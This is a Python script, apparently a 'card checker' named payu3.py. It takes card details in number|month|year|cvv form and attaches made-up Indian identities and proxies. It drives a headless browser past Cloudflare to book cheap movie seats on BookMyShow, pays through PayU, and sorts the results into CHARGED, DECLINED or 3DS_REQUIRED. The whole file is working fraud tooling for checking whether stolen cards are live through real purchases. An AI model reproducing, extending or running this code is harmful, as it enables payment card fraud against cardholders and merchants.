    """Poll verdict first (authoritative), SPA response as fallback."""
    view = (poll_data or {}).get("view") or {}
    state = str(view.get("state") or "")
    msg = str(view.get("message") or "").strip()
    if state == "Success":
        return "CHARGED", msg or "Payment Successful"
    if state == "Failed":
        low = msg.lower()
        for key, code in _PAYU_ERROR_MAP.items():
            if key in low:
                return code, msg
        rp = (poll_data or {}).get("redirectionParamsData") or {}
        ec = str(rp.get("errorCode") or "")
        em = str(rp.get("errorMessage") or "")
        if em:
            low = em.lower()
            for key, code in _PAYU_ERROR_MAP.items():
                if key in low:
                    return code, em
        return "DECLINED", msg or em or "payment failed"

    acs = (pay_data or {}).get("acsTemplate") or ""
    if acs:
        try:
            html = base64.b64decode(acs).decode("utf-8", errors="ignore")
        except Exception:
            html = ""
        status = unmapped = em = ""
        m = re.search(r'name="status"\s+value="([^"]*)"', html)
        if m:
            status = m.group(1)
        m = re.search(r'name="unmappedstatus"\s+value="([^"]*)"', html)
        if m:
            unmapped = m.group(1)
        for field in ("error_Message", "error"):
            m = re.search(rf'name="{field}"\s+value="([^"]*)"', html)
            if m and m.group(1):
                em = m.group(1)
                break
        low_s, low_u = status.lower(), unmapped.lower()
        if (low_s in ("success", "successful", "captured")
                or low_u in ("captured", "success", "successful")
                or "payment successful" in em.lower()):
            return "CHARGED", em or "Payment Successful"
        low = em.lower()
        for key, code in _PAYU_ERROR_MAP.items():
            if key in low:
                return code, em
        if em:
            return "DECLINED", em
        return "3DS_REQUIRED", "3DS challenge"

    status = str((pay_data or {}).get("status", "")).upper()
    if status in ("SUCCESS", "SUCCESSFUL", "PAYMENT SUCCESSFUL", "CAPTURED"):
        return "CHARGED", str(pay_data.get("result") or pay_data.get("message") or "Payment Successful")
    if status in ("FAILURE", "FAILED"):
        return "DECLINED", str(pay_data.get("result") or pay_data.get("message") or "FAILURE")
    err = (pay_data or {}).get("_error") or ""
    if err:
        return "ERROR", err
    return "ERROR", str((pay_data or {}).get("message") or "unknown")


def _today() -> str:
    from datetime import datetime
    return datetime.now().strftime("%Y%m%d")


DATE = _today()


# ── entry point ──────────────────────────────────────────────────────────
async def run_bms_check(cc: str, proxy_url: str = "", region: str = REGION) -> BmsResult:
    global REGION, REGION_CODE, DATE, _CURRENT_BMS_ID
    res = BmsResult()
    parts = cc.replace("/", "|").replace(" ", "|").split("|")
    if len(parts) != 4:
        res.real_response = "invalid card format"
        return res
    number, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year
    first = random.choice(["Aditya", "Aarav", "Vivaan", "Rohan", "Kabir", "Arjun"])
    last = random.choice(["Sharma", "Patel", "Iyer", "Nair", "Reddy", "Mehta"])
    email = _email(first, last)
    phone = _in_phone()
    card = (number, month, year, cvv, first)

    _CURRENT_BMS_ID = _bms_id()
    if region != REGION:
        REGION = region
        REGION_CODE = region.upper()
        DATE = _today()

    proxy_url = pick_proxy(proxy_url)          # raises ProxyError early

    pw, browser, ctx, page = await _launch(proxy_url)
    try:
        await _cf_ready(page, f"{BMS_HOME}/explore/home/{REGION}")
        await page.context.add_cookies(
            [{"name": "bmsId", "value": '"' + _CURRENT_BMS_ID + '"', "url": BMS_HOME},
             {"name": "platform", "value": '{"segments":""}', "url": BMS_HOME},
             {"name": "preferences", "value": '{"ticketType":"M-TICKET"}', "url": BMS_HOME}])

        movies = await fetch_movies(page)
        if not movies:
            res.real_response = "no movies"
            return res

        trans, booked = None, {}
        for movie in movies[:10]:
            event_code = movie["eventCode"]
            try:
                sessions = await fetch_showtimes(page, event_code, DATE)
            except CloudflareBlocked:
                raise
            except Exception:
                continue
            for sess in sessions[:3]:
                venue_code = sess["venueCode"]
                try:
                    shows = await fetch_seat_layout(page, event_code, DATE, venue_code)
                except CloudflareBlocked:
                    raise
                except Exception:
                    continue
                if not shows:
                    continue
                # layout is authoritative for sessionId; the showtimes list can
                # point at stale sessions.  Try the two cheapest sessions.
                for sh in _sessions_by_price(shows)[:2]:
                    session_id = sh["sessionId"]
                    try:
                        seat_map = await fetch_seat_map(page, venue_code, session_id, _fb_id())
                    except CloudflareBlocked:
                        raise
                    except Exception:
                        continue
                    if not seat_map["rows"]:
                        continue
                    pick = _cheapest_bookable([sh], seat_map)
                    if not pick:
                        continue
                    await _push_route(page, f"/movies/{REGION}/seat-layout/{event_code}/"
                                            f"{venue_code}/{session_id}/{DATE}")
                    try:
                        t = await book(page, event_code, venue_code, session_id,
                                       pick["priceCode"], pick["areaCatCode"], seat_map)
                    except CloudflareBlocked:
                        raise
                    except Exception:
                        continue
                    t.update({"venueCode": venue_code, "eventCode": event_code,
                              "amountPayable": int(pick["curPrice"])})
                    trans, booked = t, {"amount": pick["curPrice"]}
                    break
                if trans:
                    break
            if trans:
                break

        if trans is None:
            res.real_response = "no bookable movie/show"
            return res
        res.transaction_id = trans["transactionId"]
        res.booking_id = trans["bookingId"]
        res.amount = f"{booked['amount']:.2f}"

        await set_user_details(page, email, phone)
        await osp(page, trans)

        pay_page = await ctx.new_page()
        if os.environ.get("BMS_BLOCK_ASSETS", "1") in ("1", "true", "yes"):
            await pay_page.route("**/*", _block)
        pay_data = await pay(pay_page, pay_page, trans, card, email, phone)
        res.payment_id = pay_data.get("_payment_id") or ""
        poll_data = await poll_status(page, trans["transactionId"], res.payment_id)
        code, real = _map_payu(pay_data, poll_data)
        res.response_code = code
        res.real_response = real
        res.payu_id = str(pay_data.get("payuId") or "")
        return res
    finally:
        try:
            await browser.close()
        except Exception:
            pass
        try:
            await pw.stop()
        except Exception:
            pass


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("usage: python3 payu3.py <cc> [proxy] [region]")
        sys.exit(1)
    cc = sys.argv[1]
    proxy = sys.argv[2] if len(sys.argv) > 2 else ""
    region = sys.argv[3] if len(sys.argv) > 3 else REGION
    r = asyncio.run(run_bms_check(cc, proxy, region))
    print(json.dumps({"response_code": r.response_code, "real_response": r.real_response,
                      "amount": r.amount, "transaction_id": r.transaction_id,
                      "booking_id": r.booking_id, "payu_id": r.payu_id,
                      "payment_id": r.payment_id}, indent=2))
